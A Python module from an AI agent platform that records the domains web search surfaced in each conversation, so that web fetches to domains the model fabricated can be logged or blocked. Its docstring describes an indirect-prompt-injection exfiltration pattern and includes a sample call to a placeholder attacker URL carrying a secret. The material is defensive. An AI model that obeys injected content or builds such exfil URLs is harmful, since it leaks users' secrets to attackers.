"""Conversation-scoped set of platform-surfaced source domains (PI-002 出网外泄观测).

``web_fetch`` will fetch ANY public URL the model hands it. The indirect-prompt-
injection exfil pattern is: poisoned web/file content drives the model to
``web_fetch("https://attacker/?d=<secret>")`` — the attacker's access log then holds
the secret (the SSRF guard only blocks *internal* targets, not public exfil).

The deterministic half we can reason about: a *legitimate* deep-read targets a domain
the platform itself surfaced (a ``web_search`` result the user can see), whereas an
exfil URL is one the model *fabricated*. This module records, per conversation, the
domains ``web_search`` surfaced, so ``web_fetch`` can tell "deep-read of a search hit"
(silent) from "fetch of a model-constructed novel domain" (logged; refused under the
opt-in flag — see ``web_fetch._guard_novel_domain_exfil`` and
``config.search.web_fetch_block_novel_query``).

Scope & posture mirror the sibling ``url_cache`` / ``search_cache`` registries:
conversation-scoped, bounded (per-conversation domain cap + idle-conversation reaping
+ a process-wide conversation cap), and an in-process singleton (front with Redis to
scale out; a miss just means a domain is treated as novel — fail-observable, never a
correctness dependency).
"""

from __future__ import annotations

import time
from collections import OrderedDict

from agentcore.core.logging import get_logger

logger = get_logger(__name__)

# Max distinct source domains tracked per conversation (LRU-evict the oldest). A
# research conversation rarely cites more than a few dozen distinct domains; the cap
# only bounds memory, and an evicted domain merely degrades to "treated as novel".
SOURCE_DOMAINS_MAX_PER_CONVERSATION = 256
# Max conversations held process-wide (LRU-evict the least-recently-used).
SOURCE_DOMAINS_MAX_CONVERSATIONS = 512
# An idle conversation's whole domain set is reaped after this long untouched.
SOURCE_DOMAINS_CONVERSATION_TTL_SECONDS = 30 * 60.0


class ConversationSourceDomains:
    """One conversation's bounded, LRU-ordered set of platform-surfaced domains.

    Domains are stored already normalised (lowercased, ``www.`` stripped — the
    ``site_of`` form), so membership compares apples to apples with ``web_fetch``'s
    ``site_of(url)``. Bounded by a count cap (LRU-evict); ``last_access`` lets the
    registry reap an idle conversation.
    """

    def __init__(self, *, max_domains: int = SOURCE_DOMAINS_MAX_PER_CONVERSATION) -> None:
        # value is unused — OrderedDict gives us an LRU-ordered set.
        self._domains: OrderedDict[str, None] = OrderedDict()
        self._max_domains = max_domains
        self.last_access: float = time.time()

    def record(self, domains: set[str]) -> None:
        """Add ``domains`` (already ``site_of``-normalised, non-empty) as most-recent,
        then enforce the count cap."""
        self.last_access = time.time()
        for domain in domains:
            if not domain:
                continue
            self._domains[domain] = None
            self._domains.move_to_end(domain)
        while len(self._domains) > self._max_domains:
            self._domains.popitem(last=False)

    def has(self, domain: str) -> bool:
        """Whether ``domain`` (``site_of`` form) was surfaced in this conversation."""
        self.last_access = time.time()
        present = domain in self._domains
        if present:
            self._domains.move_to_end(domain)
        return present

    def is_idle(self, ttl_seconds: float) -> bool:
        """Whether this set has not been touched within ``ttl_seconds`` (the registry
        uses it to drop a whole idle conversation)."""
        return (time.time() - self.last_access) > ttl_seconds

    def __len__(self) -> int:
        return len(self._domains)


class SourceDomainRegistry:
    """Process-wide ``conversation_id → ConversationSourceDomains`` map.

    Bounded by a conversation **count** cap (LRU-evict) and an idle **TTL** (a
    conversation untouched within the window is dropped). Same single-worker in-process
    posture as the url / search caches (front with Redis to scale out).
    """

    def __init__(
        self,
        *,
        max_conversations: int = SOURCE_DOMAINS_MAX_CONVERSATIONS,
        conversation_ttl_seconds: float = SOURCE_DOMAINS_CONVERSATION_TTL_SECONDS,
        max_domains_per_conversation: int = SOURCE_DOMAINS_MAX_PER_CONVERSATION,
    ) -> None:
        self._sets: OrderedDict[str, ConversationSourceDomains] = OrderedDict()
        self._max_conversations = max_conversations
        self._conversation_ttl = conversation_ttl_seconds
        self._max_domains = max_domains_per_conversation

    def record(self, conversation_id: str, domains: set[str]) -> None:
        """Record ``domains`` web_search surfaced for ``conversation_id`` (no-op when
        unscoped or empty)."""
        if not conversation_id or not domains:
            return
        self._get_or_create(conversation_id).record(domains)

    def has_domain(self, conversation_id: str, domain: str) -> bool:
        """Whether ``domain`` (``site_of`` form) was surfaced in ``conversation_id``.

        ``False`` for an unknown conversation or domain — i.e. a domain the platform
        never surfaced is treated as novel (the conservative default for exfil
        observability)."""
        if not conversation_id or not domain:
            return False
        self._evict_idle()
        entry = self._sets.get(conversation_id)
        if entry is None:
            return False
        self._sets.move_to_end(conversation_id)
        return entry.has(domain)

    def _get_or_create(self, conversation_id: str) -> ConversationSourceDomains:
        self._evict_idle()
        entry = self._sets.get(conversation_id)
        if entry is None:
            entry = ConversationSourceDomains(max_domains=self._max_domains)
            self._sets[conversation_id] = entry
        self._sets.move_to_end(conversation_id)
        while len(self._sets) > self._max_conversations:
            self._sets.popitem(last=False)
        return entry

    def _evict_idle(self) -> None:
        idle = [cid for cid, s in self._sets.items() if s.is_idle(self._conversation_ttl)]
        for cid in idle:
            del self._sets[cid]

    def __len__(self) -> int:
        return len(self._sets)

    def __contains__(self, conversation_id: object) -> bool:
        return conversation_id in self._sets


# Process-wide registry, shared by web_search (writer) and web_fetch (reader) so a
# conversation's surfaced-domain set survives across turns (single-worker posture).
_registry: SourceDomainRegistry = SourceDomainRegistry()


def default_source_domain_registry() -> SourceDomainRegistry:
    """The process-wide source-domain registry (web_search records, web_fetch reads)."""
    return _registry
